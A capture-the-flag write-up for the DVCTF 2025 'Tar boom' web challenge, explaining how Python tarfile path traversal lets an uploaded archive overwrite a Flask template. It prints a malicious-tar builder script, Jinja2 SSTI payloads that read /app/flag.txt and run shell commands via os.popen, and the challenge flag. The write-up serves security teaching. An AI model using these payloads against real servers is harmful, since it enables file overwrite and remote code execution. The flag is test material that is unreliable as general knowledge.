---
ctf: DVCTF
title: Tar boom
authors:
    - name:
      url:
description: Within the Louvre Museum's intranet, there is a service that allows trusted users to upload .tar files and view their content. However, this service has been exploited by a hacker. He was able to retrieve crucial information about the Louvre's security, hidden within the flag.txt.
categories:
    - web
difficulty: Medium
ctf_year: 2025
challengefiles: tarboom
published: "2025-03-27"
---

# TL;DR

- **Challenge Setup:** We are given a small **Python Flask** web application allowing the upload of tar archives being unpacked by the backend.
- **Vulnerability:** The used **Python** module **tarfile** is vulnerable to path traversal attacks via the file names of the extracted files, allowing the overwrite of arbitrary files.
- **Exploitation:** Overwriting the `result.html` template containing an **SSTI** payload results in **RCE**.

# Introduction

Connecting to the server, we are greeted by a simple landing page inviting us to upload a tar archive:

![landing page](ctf/writeups/dvctf/tarboom/landing.png "landing page")

Uploading a tar archive with random test files leads us to the following overview showing the tree of files and directories the archive consists of:

![uploaded benign tar archive](ctf/writeups/dvctf/tarboom/normal_upload.png "uploaded benign tar archive")

# Reconnaissance

Analyzing the code reveals that only tar files are accepted. Trying to upload any other file format will be rejected. During upload, the backend will unpack the archive with the **Python** module **tarfile**:

```python
def extract_tar(tar_path, extract_dir):
    try:
        with tarfile.open(tar_path, 'r:*') as tar:
            print(f"Extracting '{tar_path}' to '{extract_dir}'...")
            tar.extractall(path=extract_dir, filter='fully_trusted')
            print("Extraction completed successfully.")
    except tarfile.TarError as e:
        print(f"Error: Failed to extract the TAR file. {e}")
```

This processing is needed to print out the file tree after the upload. The extracted files are saved at `uploads/<tar-archive-name>`.

# Vulnerability Description

The use of the **Python** module **tarfile** is well known for a directory traversal vulnerability and even got its own [CVE](https://nvd.nist.gov/vuln/detail/cve-2007-4559). In the code, the `extractall` function simply concatenates the current path with the file name:

```python
dirpath = os.path.join(path, tarinfo.name)
```

So by simply having a file name with several `../` as a prefix will result in arbitrary file write. To make it easier to generate this kind of archive, we can use the following script, adding the content of specific files with a name of your choice to your malicious tar archive:

```python
import tarfile

overwrites = [
    ('../', 'test.txt'),
]

with tarfile.open('malicious.tar', 'w') as tar:
    for directory, filename in overwrites:
        tar.add(filename, arcname=f'{directory}/{filename}')
```

This vulnerability was never fixed and probably will never be fixed. The previous maintainer even wrote an [article](https://www.gustaebel.de/lars/CVE-2007-4559.html) about the problems around fixing this vulnerability. This is not the only library being vulnerable to this kind of attack. There is a whole research around this topic and you might be interested in reading further in [Zip Slip Snyk](https://security.snyk.io/research/zip-slip-vulnerability) and [Zip Slip Github](https://github.com/snyk/zip-slip-vulnerability).

# Exploitation

Although exploiting this vulnerability seems easy, you have to be careful picking a target for the arbitrary file write. You might think we could just simply overwrite the `scripts/tarExtract.py` file and thus serving our own **Python** code, which will be executed when this functionality is called. Another idea could be exploiting the **Python PATH** by simply adding an `os.py` file right next to the `app.py`. But sadly, both of these ideas won't work out as **Python** will always immediately load the needed modules into the memory. So once the **Python** modules are loaded, replacing the corresponding files won't do anything. As a side note, if the **Flask** server was started with `debug=True`, the aforementioned approaches will work, as the server will restart and reload the modules when file changes are detected. But in this challenge, this config is turned off. Luckily enough, **Python** will only lazy load all of the code. This means that only when needed for the first time, the modules are loaded into memory. Thus we have to find a file that is not immediately needed when connecting to the server. In this case, only the `result.html` is not immediately loaded. To get an arbitrary file read, which is enough to obtain the flag, we can simply extend the template with an **SSTI** as follows:

```html
<pre>
{{ get_flashed_messages.__globals__.__builtins__.open("/app/flag.txt").read() }}
{% for line in tree %}
{{ line }}
{% endfor %}
</pre>
    <a href="/">Upload another backup</a>
</div>
```

This will give us the flag:

![flag extracted](ctf/writeups/dvctf/tarboom/flag.png "flag extracted")

We can even escalate this further to **RCE** to fully pwn the web server with `{{ get_flashed_messages.__globals__['os'].popen('ls -alps').read() }}`:

![rce](ctf/writeups/dvctf/tarboom/rce.png "rce")

But keep in mind you will only be able to change the `result.html` template via the very first malicious upload, as afterwards, also this template is already loaded into memory by **Python**.


# Mitigation

Although you might think you are safe because you got a filter, only allowing specific file extensions, won't be enough. Processing user input with any module should always be enjoyed with caution. Make sure to read the documentation and especially the security warnings to prevent vulnerabilities like in this challenge.

# Flag

DVCTF{rWyjzMYiQ2Jgx8wLP8kA}

# References

- https://security.snyk.io/research/zip-slip-vulnerability
- https://github.com/snyk/zip-slip-vulnerability
